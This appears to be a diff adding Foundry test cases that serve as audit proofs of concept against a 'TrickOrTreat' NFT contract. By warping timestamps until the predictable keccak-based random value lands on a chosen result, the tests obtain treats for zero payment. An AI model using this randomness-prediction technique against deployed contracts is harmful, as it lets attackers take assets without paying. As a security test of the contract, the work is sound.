@@ -11,6 +11,7 @@ contract TrickOrTreatTest is Test {
     address user2 = makeAddr("user2");
 
     event TreatAdded(string name, uint256 cost, string metadataURI);
+    event Swapped(address indexed user, string treatName, uint256 tokenId);
 
     function setUp() public {
         vm.deal(user, 1 ether);
@@ -114,6 +115,47 @@ contract TrickOrTreatTest is Test {
         vm.prank(address(buyer));
         vm.expectRevert();
         protocol.trickOrTreat{ value: 0.2 ether }("candy");
+    }
+
+    function testDOSonPendingMechanism() public {
+        protocol.addTreat("candy", 1 ether, "uri1");
+        uint256 tokenId = protocol.nextTokenId();
+        uint256 random;
+        while (true) {
+            uint256 timestramp = block.timestamp;
+            random = uint256(keccak256(abi.encodePacked(timestramp, address(user), tokenId, block.prevrandao))) % 1000 + 1;
+            if (random == 2) {
+                break;
+            }
+            vm.warp(timestramp + 1);
+        }
+
+        vm.prank(user);
+        vm.expectEmit();
+        emit Swapped(address(user), "candy", tokenId);
+        //call with zero value
+        protocol.trickOrTreat{ value: 0 }("candy");
+    }
+
+    function testTreatsAt1WeiForFree() public {
+        protocol.addTreat("candy", 1 wei, "uri1");
+
+        uint256 tokenId = protocol.nextTokenId();
+        uint256 random;
+        while (true) {
+            uint256 timestramp = block.timestamp;
+            random = uint256(keccak256(abi.encodePacked(timestramp, address(user), tokenId, block.prevrandao))) % 1000 + 1;
+            if (random == 1) {
+                break;
+            }
+            vm.warp(timestramp + 1);
+        }
+
+        uint256 balanceBefore = address(user).balance;
+        vm.prank(user);
+        protocol.trickOrTreat{ value: 1 ether }("candy");
+
+        assert(address(user).balance == balanceBefore);
     }
 }
 
